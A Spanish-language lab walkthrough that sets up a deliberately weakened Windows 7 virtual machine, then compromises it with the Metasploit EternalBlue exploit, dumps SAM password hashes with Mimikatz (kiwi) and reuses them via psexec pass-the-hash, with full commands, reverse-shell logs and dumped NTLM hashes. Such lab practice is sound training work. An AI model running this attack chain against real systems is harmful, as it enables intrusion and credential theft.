# Conectarse con SMB mediante el dumpeo de hashes (Pass-The-Hash)

## Configurar SMBv2 y reglas firewall

Abrir cmd como administrador.

Habilitar SMBv2:

```shell
sc config lanmanworkstation depend= bowser/mrxsmb10/mrxsmb20/nsi
sc config mrxsmb20 start= auto
```

Reiniciar el servicio:

```shell
net stop lanmanworkstation
net start lanmanworkstation
```

Desactivar el firewall para permitir la detección por nmap

```shell
netsh advfirewall set allprofiles state off
```

## Instalacion de apache24 en windows

Nos descargamos apache en `.zip` de la arquitectura que necesitemos en mi caso utilice el archivo llamado `httpd-2.4.62-240718-win64-VS17.zip`.

URL apache24 = https://www.apachelounge.com/download/

Una vez descargado, lo descomprimimos y nos dara una carpeta con 3 archivos, solo nos interesa la carpeta llamada `Apache24` por lo que la moveremos a la ruta `C:\`.

Una vez que la carpeta este ahi, necesitaremos instalar las dependencias, que seran las siguientes.

URL mega (Winsows 7 Service Pack 1 - 64 bits) = https://mega.nz/file/lbZyHQoS#h8B3jmgcNSKI9KMvVjuXzqnrdMqtb40rsgpJHmBSSDI

URL (Versión de Microsoft Visual C++ Redistributable más reciente) = https://learn.microsoft.com/es-es/cpp/windows/latest-supported-vc-redist?view=msvc-170

Primero descomprimiremos el archivo `Winsows 7 Service Pack 1 - 64 bits` y lo ejecutaremos, esto tardara un poco ya que se estara instalando un paquete en el S.O. y se reiniciara varias veces, una vez instalado, descomprimiremos el segundo archivo llamado `VC_redist.x64` o la arquitectura que se haya descargado, lo instalaremos y una vez instalados estos 2 archivos, cambiaremos una pequeña configuracion del apache24.

```shell
cd C:\apache24\conf\
notepad httpd.conf
```

Esto abrira un archivo de texto con la configuracion del apache, por lo que nos iremos a una linea comentada llamada `#Listen www.example.com:80` y lo cambiaremos por lo siguiente (Quitando el #).

```
Listen 0.0.0.0:8080
```

Para que asi escuche en todas las direcciones de red, a parte comentaremos poniendo un `#` donde pone `Listen 80` quedara algo tal que asi.

```
#Listen 80
```

Despues y por ultimo nos iremos a la siguiente linea llamada `#ServerName 10.10.10.10:80` en vuestro caso la IP sera diferente, pero tendremos que quitar ese `#`, esa IP y poner lo siguiente.

```
ServerName localhost:8080
```

Una vez cambiado todo esto, lo guardaremos y haremos lo siguiente en terminal.

```shell
cd C:\Apache24\bin
```

Instalar apache como un servicio por si acaso.

```shell
httpd.exe -k install -n "Apache2.4"
```

Iniciar el servicio de apache.

```shell
httpd.exe -k start -n "Apache2.4"
```

Y para comprobar que todo funciona correctamente lo verificaremos de la siguiente manera.

```shell
netstat -an | find "8080"
```

Tendras que ver algo asi:

```
TCP    0.0.0.0:8080               0.0.0.0:0                 LISTENING
```

Y si nos vamos a `http://localhost/` tendriamos que ver nuestro apache y cuando hagamos un `nmap`, deberiamos de ver el puerto apache (80) abierto.

## Instalar software BadBlue en apache

URL BadBlue2.7 = https://badblue-pe.uptodown.com/windows/descargar

Una vez que lo ejecutemos como administrador el `.exe` se nos instalara de forma automatica el software BadBlue y lo podremos ver en la siguiente `URL`.

```
URL = http://127.0.0.1/ext.dll?mfcisapicommand=loadpage&page=index.htx
```

Y en la maquina atacante se podra entrar mediante.

```
URL = http://<IP>:80/
```

## Habilitar usuario Administrador en Windows 7

Primero cambiaremos la contraseña al administrador en el cmd como administrador.

```shell
net user Administrador <NEW_PASSWORD>
```

Despues activaremos la cuenta administrador.

```shell
net user Administrador /active:yes
```

## Explotar maquina windows, para dumpear los hashes y contectarnos mediante SMB con los hashes

```shell
nmap -sCV -p80,8080,445 <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-30 14:31 CEST
Nmap scan report for 192.168.5.141
Host is up (0.00046s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         BadBlue httpd 2.7
445/tcp  open  microsoft-ds Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
8080/tcp open  http         Apache httpd 2.4.62 ((Win64))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.62 (Win64)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-open-proxy: Proxy might be redirecting requests
MAC Address: 00:0C:29:CF:D6:A6 (VMware)
Service Info: Host: VULN-SMBV2; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-07-30T12:32:03
|_  start_date: 2024-07-30T11:43:11
|_clock-skew: mean: -39m59s, deviation: 1h09m16s, median: 0s
| smb-os-discovery: 
|   OS: Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: vuln-smbv2
|   NetBIOS computer name: VULN-SMBV2\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-07-30T14:32:03+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: VULN-SMBV2, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:cf:d6:a6 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.54 seconds
```

```shell
msfconsole -q
```

```shell
search eternalblue
```

```shell
use exploit/windows/smb/ms17_010_eternalblue
```

```shell
set RHOSTS <IP>
```

```shell
exploit
```

Info:

```
[*] Started reverse TCP handler on 192.168.5.199:4444 
[*] 192.168.5.141:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.5.141:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.5.141:445     - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.5.141:445 - The target is vulnerable.
[*] 192.168.5.141:445 - Connecting to target for exploitation.
[+] 192.168.5.141:445 - Connection established for exploitation.
[+] 192.168.5.141:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.5.141:445 - CORE raw buffer dump (38 bytes)
[*] 192.168.5.141:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
[*] 192.168.5.141:445 - 0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service 
[*] 192.168.5.141:445 - 0x00000020  50 61 63 6b 20 31                                Pack 1          
[+] 192.168.5.141:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.5.141:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.5.141:445 - Sending all but last fragment of exploit packet
[*] 192.168.5.141:445 - Starting non-paged pool grooming
[+] 192.168.5.141:445 - Sending SMBv2 buffers
[+] 192.168.5.141:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.5.141:445 - Sending final SMBv2 buffers.
[*] 192.168.5.141:445 - Sending last fragment of exploit packet!
[*] 192.168.5.141:445 - Receiving response from exploit packet
[+] 192.168.5.141:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.5.141:445 - Sending egg to corrupted connection.
[*] 192.168.5.141:445 - Triggering free of corrupted buffer.
[-] 192.168.5.141:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 192.168.5.141:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 192.168.5.141:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] 192.168.5.141:445 - Connecting to target for exploitation.
[+] 192.168.5.141:445 - Connection established for exploitation.
[+] 192.168.5.141:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.5.141:445 - CORE raw buffer dump (38 bytes)
[*] 192.168.5.141:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
[*] 192.168.5.141:445 - 0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service 
[*] 192.168.5.141:445 - 0x00000020  50 61 63 6b 20 31                                Pack 1          
[+] 192.168.5.141:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.5.141:445 - Trying exploit with 17 Groom Allocations.
[*] 192.168.5.141:445 - Sending all but last fragment of exploit packet
[*] 192.168.5.141:445 - Starting non-paged pool grooming
[+] 192.168.5.141:445 - Sending SMBv2 buffers
[+] 192.168.5.141:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.5.141:445 - Sending final SMBv2 buffers.
[*] 192.168.5.141:445 - Sending last fragment of exploit packet!
[*] 192.168.5.141:445 - Receiving response from exploit packet
[+] 192.168.5.141:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.5.141:445 - Sending egg to corrupted connection.
[*] 192.168.5.141:445 - Triggering free of corrupted buffer.
[*] Sending stage (201798 bytes) to 192.168.5.141
[*] Meterpreter session 1 opened (192.168.5.199:4444 -> 192.168.5.141:49460) at 2024-07-30 14:51:43 +0200
[+] 192.168.5.141:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.5.141:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.5.141:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

## Cargar kiwi y dumpeo de hashes (Teniendo una shell)

```shell
load kiwi
```

Info:

```
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
```

```shell
lsa_dump_sam
```

Info:

```
[+] Running as SYSTEM
[*] Dumping SAM
Domain : VULN-SMBV2
SysKey : 398c00341f04880ff6d05411bf9bb5b6
Local SID : S-1-5-21-3493810251-3775582006-1769795684

SAMKey : d7541ea70f23ee8091af2c6953673fac

RID  : 000001f4 (500)
User : Administrador
  Hash NTLM: 7ce21f17c0aee7fb9ceba532d0546ad6

RID  : 000001f5 (501)
User : Invitado

RID  : 000003e8 (1000)
User : diseo
  Hash NTLM: b1f702c125f162ed66636c7d825429e2
```

```shell
hashdump
```

Info:

```
Administrador:500:aad3b435b51404eeaad3b435b51404ee:7ce21f17c0aee7fb9ceba532d0546ad6:::
diseo:1000:aad3b435b51404eeaad3b435b51404ee:b1f702c125f162ed66636c7d825429e2:::
Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

> Hash NTLM

```
Administrador = 7ce21f17c0aee7fb9ceba532d0546ad6
diseo = b1f702c125f162ed66636c7d825429e2
```

> Hash LM y NTLM

```
Administrador = aad3b435b51404eeaad3b435b51404ee:7ce21f17c0aee7fb9ceba532d0546ad6
diseo = aad3b435b51404eeaad3b435b51404ee:b1f702c125f162ed66636c7d825429e2
```

## Conectarnos por SMB con los hashes

```shell
search psexec
```

Seleccionamos el exploit.

```shell
use exploit/windows/smb/psexec
```

Configuramos el exploit, añadiendo el usuario y los hashes LM y NTLM como contraseña del administrador y el target el que veis.

```shell
set RHOSTS <IP>
set SMBUser Administrador
set SMBPass aad3b435b51404eeaad3b435b51404ee:7ce21f17c0aee7fb9ceba532d0546ad6
set target Native\ upload
```

Ejecutamos el exploit.

```shell
exploit
```

Info:

```
[*] Started reverse TCP handler on 192.168.5.199:4444 
[*] 192.168.5.141:445 - Connecting to the server...
[*] 192.168.5.141:445 - Authenticating to 192.168.5.141:445 as user 'Administrador'...
[!] 192.168.5.141:445 - peer_native_os is only available with SMB1 (current version: SMB2)
[*] 192.168.5.141:445 - Uploading payload... WHSNLJPY.exe
[*] 192.168.5.141:445 - Created \WHSNLJPY.exe...
[*] Sending stage (176198 bytes) to 192.168.5.141
[+] 192.168.5.141:445 - Service started successfully...
[*] 192.168.5.141:445 - Deleting \WHSNLJPY.exe...
[*] Meterpreter session 3 opened (192.168.5.199:4444 -> 192.168.5.141:49216) at 2024-07-30 17:23:22 +0200

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Y con esto ya nos habriamos autenticado como administradores mediante SMB y los hashes que dumpeamos con kiwi.

> AVISO

Si no funcionara el exploit de `psexec` revisar que es con el usuario administrador, por que otro usuario no funciona a no ser que tenga privilegios de administrador, y si siguiera fallando teneis que aseguraros de que el SMB es v1, por que con la v2 no va a ir.

### Cambiar SMB a v1

Abre el gestor de archivos con lo siguiente.

`Windows + R` y escribe `regedit`

Ahora nos tendremos que ir a la siguiente ubicacion.

```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters
```

Despues dentro de esa carpeta añadiremos lo siguiente.

**Agregar Clave**:

* En el panel derecho, haz clic derecho en un espacio vacío y selecciona **Nuevo** > **Valor DWORD (32 bits)**.
* Nombra la nueva entrada como `SMB1`.
* Haz doble clic en la entrada `SMB1` y establece el valor en `1` para habilitar SMB1. **Modificar Clave Existente**:
* Si ya existe una entrada llamada `SMB1`, haz doble clic en ella y asegúrate de que el valor sea `1`.

Una vez hecho esto lo podremos comprobar desde la maquina atacante de la siguiente forma.

```shell
nmap -p 445 --script smb-protocols <IP>
```

Y se tendria que ver algo asi:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-30 17:31 CEST
Nmap scan report for 192.168.5.141
Host is up (0.00028s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 00:0C:29:CF:D6:A6 (VMware)

Host script results:
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     2:0:2
|_    2:1:0

Nmap done: 1 IP address (1 host up) scanned in 0.30 seconds
```
